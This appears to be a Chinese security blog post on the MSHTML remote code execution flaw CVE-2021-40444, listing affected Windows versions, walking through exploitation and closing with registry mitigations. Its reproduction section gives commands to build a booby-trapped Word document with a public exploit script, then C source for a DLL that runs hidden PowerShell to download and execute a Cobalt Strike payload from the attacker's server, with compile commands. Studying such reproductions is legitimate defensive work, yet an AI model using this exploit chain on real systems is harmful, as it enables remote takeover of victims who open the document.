## 漏洞描述

2021年9月8日，微软发布安全通告披露了Microsoft MSHTML远程代码执行漏洞，攻击者可通过制作恶意的ActiveX控件供托管浏览器呈现引擎的
Microsoft
Office文档使用，成功诱导用户打开恶意文档后，可在目标系统上以该用户权限执行任意代码，微软在通告中指出已检测到该漏洞被在野利用，请相关用户采取措施进行防护。

MSHTML(又称为Trident)是微软旗下的Internet
Explorer浏览器引擎，也用于Office应用程序，以在Word、Excel或PowerPoint文档中呈现Web托管的内容，AcitveX控件是微软COM架构下的产物，在Windows的Office套件、IE浏览器中有广泛的应用，利用ActiveX控件即可与MSHTML组件进行交互。

## 影响范围

    
    
    Windows Server, version 20H2 (Server Core Installation)  
    Windows Server, version 2004 (Server Core installation)  
    Windows Server 2022 (Server Core installation)  
    Windows Server 2022  
    Windows Server 2019 (Server Core installation)  
    Windows Server 2019  
    Windows Server 2016 (Server Core installation)  
    Windows Server 2016  
    Windows Server 2012 R2 (Server Core installation)  
    Windows Server 2012 R2  
    Windows Server 2012 (Server Core installation)  
    Windows Server 2012  
    Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)  
    Windows Server 2008 for x64-based Systems Service Pack 2  
    Windows Server 2008 32-bit Systems Service Pack 2 (Server Core installation)  
    Windows Server 2008 32-bit Systems Service Pack 2  
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)  
    Windows Server 2008 R2 for x64-based Systems Service Pack 1  
    Windows RT 8.1  
    Windows 8.1 for x64-based systems  
    Windows 8.1 32-bit systems  
    Windows 7 for x64-based Systems Service Pack 1  
    Windows 7 32-bit Systems Service Pack 1  
    Windows 10 for x64-based Systems  
    Windows 10 32-bit Systems  
    Windows 10 Version 21H1 for x64-based Systems  
    Windows 10 Version 21H1 for ARM64-based Systems  
    Windows 10 Version 21H1 32-bit Systems  
    Windows 10 Version 20H2 for x64-based Systems  
    Windows 10 Version 20H2 for ARM64-based Systems  
    Windows 10 Version 20H2 32-bit Systems  
    Windows 10 Version 2004 for x64-based Systems  
    Windows 10 Version 2004 for ARM64-based Systems  
    Windows 10 Version 2004 32-bit Systems  
    Windows 10 Version 1909 for x64-based Systems  
    Windows 10 Version 1909 for ARM64-based Systems  
    Windows 10 Version 1909 32-bit Systems  
    Windows 10 Version 1809 for x64-based Systems  
    Windows 10 Version 1809 for ARM64-based Systems  
    Windows 10 Version 1809 32-bit Systems  
    Windows 10 Version 1607 for x64-based Systems  
    Windows 10 Version 1607 32-bit Systems

## 漏洞危害

未经身份验证的攻击者可以利用该漏洞在目标系统上执行代码。

## 漏洞复现

复现环境：win10（office10），kali2021

github地址：<https://github.com/lockedbyte/CVE-2021-40444>

![image-20210916101633325](https://image.3001.net/images/20210916/1631770191_6142d64fe053c4a92055b.png!small)

需要先安装lcab，这里 lcab 包的官方下载地址已经无法下载，改为 Debian 的下载地址

    
    
    wget http://ftp.debian.org/debian/pool/main/l/lcab/lcab_1.0b12.orig.tar.gz  
    tar zxvf lcab_1.0b12.orig.tar.gz  
    cd lcab-1.0b12  
    ./configure  
    make  
    sudo make install

![image-20210916101452067](https://image.3001.net/images/20210916/1631770193_6142d651db9f5f6bdf5bb.png!small)

![image-20210916101548259](https://image.3001.net/images/20210916/1631770196_6142d6543c00e36749b33.png!small)

然后执行命令

    
    
    python3 exploit.py generate test/calc.dll http://192.168.190.129:80

![image-20210916101732983](https://image.3001.net/images/20210916/1631770198_6142d6565c62e838487df.png!small)

可以看见在out目录下生成了document.docx文件;

![image-20210916101828485](https://image.3001.net/images/20210916/1631770199_6142d657c95e6c935312d.png!small)

开启http服务

    
    
    python exploit.py host 80

![image-20210916101951396](https://image.3001.net/images/20210916/1631770200_6142d658a537f68e87d92.png!small)

![image-20210916102050987](https://image.3001.net/images/20210916/1631770201_6142d65991861c70fe276.png!small)

打开word.html文件可以看见，url是向外请求的cab文件链接

![image-20210916102326389](https://image.3001.net/images/20210916/1631770203_6142d65b48e01e77f7e40.png!small)

接着把document.docx拉到受害机子双击打开(切记：这里受害机子一定要关闭denfender，同时ie浏览器也一定要启动运行Activex控件和插件！！！)

![image-20210915103249889](https://image.3001.net/images/20210916/1631770205_6142d65d191d36b04c801.png!small)

![image-20210915102528910.png](https://image.3001.net/images/20210916/1631770206_6142d65e54bbece21434d.png!small)

![image-20210913124555962](https://image.3001.net/images/20210916/1631770207_6142d65fd47024c1f8afd.png!small)

成功弹出计算器

![image-20210916102734479.png](https://image.3001.net/images/20210916/1631770209_6142d661afebbca5cfa00.png!small)

把document.docx文件解压，进到/word/rels/document.xml文件中可以看见，发现是通过`MSHTML`来进行远程代码执行。

![image-20210916103106420](https://image.3001.net/images/20210916/1631770211_6142d6633de7846bc363e.png!small)

### cs上线

cs生成ps payload，这里payload不要选择x64位;

![1631779296_6142f9e07b7b69e8dcf05.png!small?1630483291724](https://image.3001.net/images/20210916/1631779296_6142f9e07b7b69e8dcf05.png!small?1630483291724)

  

![image-20210916110244240](https://image.3001.net/images/20210916/1631770212_6142d66457534d6dd8085.png!small)

![1631779322_6142f9faeb4ed4b05dee9.png!small](https://image.3001.net/images/20210916/1631779322_6142f9faeb4ed4b05dee9.png!small)

![1631779283_6142f9d35933bac4ae4bf.png!small?1630483278552](https://image.3001.net/images/20210916/1631779283_6142f9d35933bac4ae4bf.png!small?1630483278552)

写入1.c：

    
    
    #include <windows.h>  
    void exec(void) {  
    system("powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://你的ip:你的端口/a'))\"");  
    return;  
    }  
    BOOL WINAPI DllMain(  
    HINSTANCE hinstDLL,  
    DWORD fdwReason,  
    LPVOID lpReserved )  
    {  
    switch( fdwReason )  
    {  
    case DLL_PROCESS_ATTACH:  
    exec();  
    break;  
    case DLL_THREAD_ATTACH:  
    break;  
    case DLL_THREAD_DETACH:  
    break;  
    case DLL_PROCESS_DETACH:  
    break;  
    }  
    return TRUE;  
    }

![image-20210916111436475.png](https://image.3001.net/images/20210916/1631770213_6142d665bbe9fbbdf07b0.png!small)

生成dll

    
    
    sudo apt-get install gcc-mingw-w64  
    i686-w64-mingw32-gcc -shared 1.c -o 1.dll

![image-20210916115843274](https://image.3001.net/images/20210916/1631770215_6142d66716d33af81271f.png!small)

![image-20210916122446247](https://image.3001.net/images/20210916/1631770216_6142d66891be8a3ac1a6d.png!small)

![image-20210916122541682](https://image.3001.net/images/20210916/1631770218_6142d66ab1765505dea76.png!small)

受害机子成功上线~

![image-20210916122619914](https://image.3001.net/images/20210916/1631770220_6142d66c64ba833e48e10.png!small)

## 缓解措施

1.在 Internet Explorer 中禁用所有 ActiveX 控件的安装。

2.将如下代码复制到文本文件中并以 .reg 文件扩展名保存：

    
    
    Windows Registry EditorVersion 5.00  
    [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet  Settings\Zones\0]  
    "1001"=dword:00000003  
    "1004"=dword:00000003  
    [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet  Settings\Zones\1]  
    "1001"=dword:00000003  
    "1004"=dword:00000003  
    [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet  Settings\Zones\2]  
    "1001"=dword:00000003  
    "1004"=dword:00000003  
    [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet  Settings\Zones\3]  
    "1001"=dword:00000003  
    "1004"=dword:00000003

b、双击.reg 文件，将其应用到策略配置单元；

c、重新启动系统以确保应用新配置。

